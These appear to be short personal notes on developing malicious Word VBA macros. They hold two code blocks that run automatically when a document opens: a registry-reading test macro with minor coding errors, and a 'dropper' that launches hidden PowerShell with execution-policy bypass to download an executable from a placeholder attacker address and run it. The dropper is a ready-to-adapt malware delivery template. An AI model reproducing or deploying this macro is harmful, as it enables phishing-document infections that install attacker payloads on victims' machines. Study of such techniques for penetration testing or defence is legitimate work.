## VBA Macro Development

#### Initial Test
- VBA script in word to retrive ProductVersion
  
```
Sub Document_Open()
  reg
End Sub

Sub AutoOpen()
  reg
End Sub

Sub reg()
  Dim wsh as Object
  set wsh = CreateObject("Wscript.shell")

  Dim RegKey as String
  set RegKey = "\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Nt\CurrentVersion"
  MsgBox "Product Version: " & wsh.RegRead(regKey & "\ProductName")
  
End Sub
```

#### Powershell script With Dropper

```
Sub AutoOpen()
  dropper
End Sub

Sub Document_Open()
  dropper
End Sub

Sub dropper()
  Dim url as String
  Dim scriptPath as String
  url = "http://$ip:$port/file.exe"
  scriptPath = "Invoke-WebRequest -Uri """ & url & """ -OutFile ""C:\Users\Admin\file.exe"";" & vbCrLf & _
  "Start-Process -FilePath ""C:\Users\Admin\file.exe"""

  Shell "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command """ & scriptPath & """"
End Sub
```
